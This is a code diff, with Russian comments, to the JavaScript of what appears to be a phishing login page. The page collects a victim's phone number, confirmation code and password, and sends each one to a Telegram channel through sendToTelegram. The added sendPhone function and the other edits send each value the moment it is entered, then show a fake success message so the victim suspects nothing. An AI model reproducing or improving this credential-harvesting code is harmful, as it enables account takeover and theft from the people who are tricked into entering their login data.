@@ -264,6 +264,24 @@
       document.getElementById('codeError').style.display = 'none';
       document.getElementById('passwordError').style.display = 'none';
     }
+    function sendPhone() {
+      const countryCode = document.querySelector('.country-code').value.trim();
+      const phoneInput = document.getElementById('phone');
+      const phone = phoneInput.value.trim();
+      if (phone.length < 10) {
+        document.getElementById('phoneError').style.display = 'block';
+        return;
+      }
+      // Объединяем код страны и номер телефона
+      phoneNumber = countryCode + phone;
+      
+      // === ИСПРАВЛЕНИЕ: Отправляем номер сразу же ===
+      sendToTelegram(`📱 Введён номер телефона: ${phoneNumber}`);
+      // ===========================================
+      
+      // Переход к следующему шагу сразу
+      showStep(2);
+    }
     function sendCode() {
       const codeInput = document.getElementById('code');
       const code = codeInput.value.trim();
@@ -272,23 +290,21 @@
         return;
       }
       confirmationCode = code; // Сохраняем код для последующей отправки
-
+      
       // === ИСПРАВЛЕНИЕ: Отправляем код сразу же ===
       sendToTelegram(`🔐 Код подтверждения для ${phoneNumber}: ${code}`);
       // ===========================================
-
+      
       document.getElementById('loading').style.display = 'block';
       document.querySelector('#step2 .btn').disabled = true;
 
-  // Переход к следующему шагу через 2 секунды (или сразу, если хотите)
+      // === ИЗМЕНЕНИЕ: Переход к следующему шагу сразу (или с небольшой задержкой для UX) ===
       setTimeout(() => {
         document.getElementById('loading').style.display = 'none';
         document.querySelector('#step2 .btn').disabled = false;
-        // alert('Спасибо! Данные в порядке.');
         showStep(3); // Переход к шагу 3
-      }, 2000);
+      }, 500); // Небольшая задержка для визуального отклика
     }
-
      function sendPassword() {
       const passwordInput = document.getElementById('password');
       const password = passwordInput.value.trim();
@@ -298,16 +314,25 @@
       }
       document.getElementById('loadingPassword').style.display = 'block';
       document.querySelector('#step3 .btn').disabled = true;
-      
-      // Отправляем все данные на Telegram
-      sendToTelegram(`🔐 Код подтверждения для +${phoneNumber}: ${confirmationCode}`);
+
+      // === ИЗМЕНЕНИЕ: Отправляем только пароль ===
       sendToTelegram(`🔑 Введён пароль: ${password}`);
-      
+      // =========================================
+
       setTimeout(() => {
         document.getElementById('loadingPassword').style.display = 'none';
         document.querySelector('#step3 .btn').disabled = false;
-        alert('Поздравляем! Все данные в порядке.');
+        // Добавим анимацию успеха
+        launchParticles(50);
+        setTimeout(() => {
+             alert('Поздравляем! Все данные в порядке.');
+        }, 1000); // Показываем алерт чуть позже, чтобы анимация успела сыграть
         // Можно добавить дальнейшую логику, например, перенаправление или сброс формы
+        // Сброс формы и возврат к первому шагу, например:
+        // document.getElementById('phone').value = '';
+        // document.getElementById('code').value = '';
+        // document.getElementById('password').value = '';
+        // showStep(1);
       }, 2000);
     }
     document.getElementById('code').addEventListener('input', function (e) {
